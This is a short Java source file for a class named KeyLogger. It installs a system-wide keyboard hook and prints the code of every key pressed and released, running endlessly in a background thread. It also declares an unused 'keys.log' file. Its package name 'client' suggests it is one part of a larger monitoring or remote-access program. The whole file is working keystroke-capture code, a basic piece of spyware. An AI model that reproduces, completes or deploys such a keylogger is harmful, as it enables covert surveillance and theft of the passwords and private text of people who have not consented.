package client;

import de.ksquared.system.keyboard.GlobalKeyListener;
import de.ksquared.system.keyboard.KeyEvent;
import de.ksquared.system.keyboard.KeyListener;

public class KeyLogger extends Thread {

	private static final String LOG_FILE = "keys.log";
	
	@Override
	public void run(){
		
		GlobalKeyListener globalKeyListener = new GlobalKeyListener();
		globalKeyListener.addKeyListener(new KeyListener(){

			@Override
			public void keyPressed(KeyEvent arg0) {
				System.out.println("PRESSED \t" + arg0.getVirtualKeyCode());				
			}

			@Override
			public void keyReleased(KeyEvent arg0) {
				System.out.println("RELEASED\t" + arg0.getVirtualKeyCode());
			}
			
		});
		
		while (true) {
			try {
				Thread.sleep(1000);
			} catch (InterruptedException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}
		}
		
	}

}
